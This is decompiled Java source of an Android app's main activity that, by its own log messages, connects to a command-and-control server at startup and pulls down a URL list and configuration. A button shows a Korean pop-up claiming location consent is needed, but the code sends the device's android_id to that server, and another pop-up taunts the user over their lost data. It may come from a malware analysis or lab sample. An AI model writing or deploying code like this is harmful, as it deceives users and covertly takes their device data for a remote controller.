package com.example.ripapp2;

import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import org.json.JSONException;

public class MainActivity extends AppCompatActivity {
    private Button startBtn;

    public native void SayHelloWorld();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        new check().isIntegrityValid(this, "test");
        MyApp myApp = (MyApp) getApplicationContext();
        myApp.setStartmsg("앱 시작");
        Toast.makeText(getApplicationContext(), myApp.getStartmsg(), 0).show();
        EdgeToEdge.enable(this);
        try {
            if (!SendData.send("/fsalke2j9sdfcjlz/BSBoQXNxCxOtACCpujH9zMdrCJsl5B").getBoolean(NotificationCompat.CATEGORY_STATUS)) {
                System.out.println("Failed to connect to C2 Server");
                finish();
            } else {
                ConfigC2.setUrllist(SendData.send("/fsalke2j9sdfcjlz/lh1sy5VXzAL8Qmadn5OOvLP5mheIo5").getJSONArray("list"));
                ConfigC2.setBody(SendData.send((Integer) 0).getJSONArray("list"));
                System.out.println("Connected to C2 Server successfully");
            }
        } catch (JSONException e) {
            System.out.println("json error");
            System.out.println(e.getMessage());
        } catch (Exception e2) {
            System.out.println("error");
            System.out.println(e2.getMessage());
        }
        setContentView(R.layout.activity_main);
        Button button = (Button) findViewById(R.id.startBtn);
        this.startBtn = button;
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Toast.makeText(MainActivity.this.getApplicationContext(), "정확한 위치를 확인 하기 위해 사용자 동의가 필요 합니다!", 0).show();
                try {
                    SendData.send((Integer) 1, MainActivity.this.getDeviceInfo());
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), new MainActivity$$ExternalSyntheticLambda0());
    }

    static /* synthetic */ WindowInsetsCompat lambda$onCreate$0(View view, WindowInsetsCompat windowInsetsCompat) {
        Insets insets = windowInsetsCompat.getInsets(WindowInsetsCompat.Type.systemBars());
        view.setPadding(insets.left, insets.top, insets.right, insets.bottom);
        return windowInsetsCompat;
    }

    /* access modifiers changed from: private */
    public String getDeviceInfo() {
        return Settings.Secure.getString(getContentResolver(), "android_id");
    }

    public void accessJob() {
        Toast.makeText(getApplicationContext(), "너의 정보의 명복을 엑셔언비이임~~~ 감사합니다!! ^^>", 0).show();
    }
}
